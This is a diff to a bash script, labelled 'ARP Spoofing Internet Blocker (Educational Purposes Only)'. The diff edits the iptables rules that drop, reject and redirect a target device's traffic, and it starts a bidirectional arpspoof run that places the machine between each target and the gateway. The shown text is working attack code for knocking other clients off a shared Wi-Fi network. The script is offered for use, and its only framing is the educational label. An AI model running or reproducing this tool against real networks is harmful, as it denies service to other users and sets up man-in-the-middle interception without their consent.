@@ -1,4 +1,4 @@
-#!/bin/bash
+#!/bin/bash -e
 
 # Made by Xiv3r v1.
 # ARP Spoofing Internet Blocker (Educational Purposes Only)
@@ -140,13 +140,11 @@ for TARGET in $TARGET_IPS; do
         continue
     fi
         # Block all traffic of the target wifi clients
-        sudo iptables -I FORWARD -s "$TARGET" -j DROP
-        sudo iptables -I FORWARD -d "$TARGET" -j DROP
-        sudo iptables -t nat -A PREROUTING -s "$TARGET" -j DNAT --to-destination "$GATEWAY"
+        sudo iptables -t nat -I PREROUTING -s "$TARGET" -j DNAT --to-destination "$GATEWAY"
         sudo iptables -I FORWARD -s "$TARGET" -p tcp -j REJECT --reject-with tcp-reset
         sudo iptables -I FORWARD -s "$TARGET" -p udp -j REJECT --reject-with icmp-port-unreachable
         sudo iptables -I FORWARD -s "$TARGET" -p icmp -j REJECT --reject-with icmp-host-unreachable
-        sudo iptables -I FORWARD -s "$TARGET" -j REJECT
+        sudo iptables -I FORWARD -s "$TARGET" -j DROP
      (
         # Bidirectional ARP Spoofing
        sudo arpspoof -i "$INTERFACE" -t "$TARGET" "$GATEWAY" >/dev/null 2>&1 &
